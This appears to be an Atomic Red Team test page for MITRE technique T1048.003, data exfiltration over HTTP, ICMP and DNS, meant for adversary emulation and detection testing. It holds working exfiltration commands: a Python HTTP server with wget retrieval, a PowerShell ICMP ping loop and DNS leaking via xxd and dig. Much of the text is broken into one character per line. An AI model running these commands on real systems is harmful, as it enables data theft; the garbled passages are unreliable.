# T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. 

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Exfiltration Over Alternative Protocol - HTTP
A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.

Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.

**Supported Platforms:** macos, linux
Run it with these steps!
1
.
 
V
i
c
t
i
m
 
S
y
s
t
e
m
 
C
o
n
f
i
g
u
r
a
t
i
o
n
:




 
 
 
 
m
k
d
i
r
 
/
t
m
p
/
v
i
c
t
i
m
-
s
t
a
g
i
n
g
-
a
r
e
a


 
 
 
 
e
c
h
o
 
"
t
h
i
s
 
f
i
l
e
 
w
i
l
l
 
b
e
 
e
x
f
i
l
t
r
a
t
e
d
"
 
>
 
/
t
m
p
/
v
i
c
t
i
m
-
s
t
a
g
i
n
g
-
a
r
e
a
/
v
i
c
t
i
m
-
f
i
l
e
.
t
x
t




2
.
 
U
s
i
n
g
 
P
y
t
h
o
n
 
t
o
 
e
s
t
a
b
l
i
s
h
 
a
 
o
n
e
-
l
i
n
e
 
H
T
T
P
 
s
e
r
v
e
r
 
o
n
 
v
i
c
t
i
m
 
s
y
s
t
e
m
:




 
 
 
 
c
d
 
/
t
m
p
/
v
i
c
t
i
m
-
s
t
a
g
i
n
g
-
a
r
e
a


 
 
 
 
p
y
t
h
o
n
 
-
m
 
S
i
m
p
l
e
H
T
T
P
S
e
r
v
e
r
 
1
3
3
7




3
.
 
T
o
 
r
e
t
r
i
e
v
e
 
t
h
e
 
d
a
t
a
 
f
r
o
m
 
a
n
 
a
d
v
e
r
s
a
r
y
 
s
y
s
t
e
m
:




 
 
 
 
w
g
e
t
 
h
t
t
p
:
/
/
V
I
C
T
I
M
_
I
P
:
1
3
3
7
/
v
i
c
t
i
m
-
f
i
l
e
.
t
x
t



### Atomic Test #2 - Exfiltration Over Alternative Protocol - ICMP
Exfiltration of specified file over ICMP protocol.

Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
```

Invoke-AtomicTest T1048.003 -TestNumbers 2

### Atomic Test #3 - Exfiltration Over Alternative Protocol - DNS
Exfiltration of specified file over DNS protocol.

**Supported Platforms:** linux
Run it with these steps!
1
.
 
O
n
 
t
h
e
 
a
d
v
e
r
s
a
r
y
 
m
a
c
h
i
n
e
 
r
u
n
 
t
h
e
 
b
e
l
o
w
 
c
o
m
m
a
n
d
.




 
 
 
 
t
s
h
a
r
k
 
-
f
 
"
u
d
p
 
p
o
r
t
 
5
3
"
 
-
Y
 
"
d
n
s
.
q
r
y
.
t
y
p
e
 
=
=
 
1
 
a
n
d
 
d
n
s
.
f
l
a
g
s
.
r
e
s
p
o
n
s
e
 
=
=
 
0
 
a
n
d
 
d
n
s
.
q
r
y
.
n
a
m
e
 
m
a
t
c
h
e
s
 
"
.
d
o
m
a
i
n
"
"
 
>
>
 
r
e
c
e
i
v
e
d
_
d
a
t
a
.
t
x
t




2
.
 
O
n
 
t
h
e
 
v
i
c
t
i
m
 
m
a
c
h
i
n
e
 
r
u
n
 
t
h
e
 
b
e
l
o
w
 
c
o
m
m
a
n
d
s
.




 
 
 
 
x
x
d
 
-
p
 
i
n
p
u
t
_
f
i
l
e
 
>
 
e
n
c
o
d
e
d
_
d
a
t
a
.
h
e
x
 
|
 
f
o
r
 
d
a
t
a
 
i
n
 
`
c
a
t
 
e
n
c
o
d
e
d
_
d
a
t
a
.
h
e
x
`
;
 
d
o
 
d
i
g
 
$
d
a
t
a
.
d
o
m
a
i
n
;
 
d
o
n
e


 
 
 
 


3
.
 
O
n
c
e
 
t
h
e
 
d
a
t
a
 
i
s
 
r
e
c
e
i
v
e
d
,
 
u
s
e
 
t
h
e
 
b
e
l
o
w
 
c
o
m
m
a
n
d
 
t
o
 
r
e
c
o
v
e
r
 
t
h
e
 
d
a
t
a
.




 
 
 
 
c
a
t
 
o
u
t
p
u
t
_
f
i
l
e
 
|
 
c
u
t
 
-
d
 
"
A
"
 
-
f
 
2
 
|
 
c
u
t
 
-
d
 
"
 
"
 
-
f
 
2
 
|
 
c
u
t
 
-
d
 
"
.
"
 
-
f
 
1
 
|
 
s
o
r
t
 
|
 
u
n
i
q
 
|
 
x
x
d
 
-
p
 
-
r



## Detection
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) 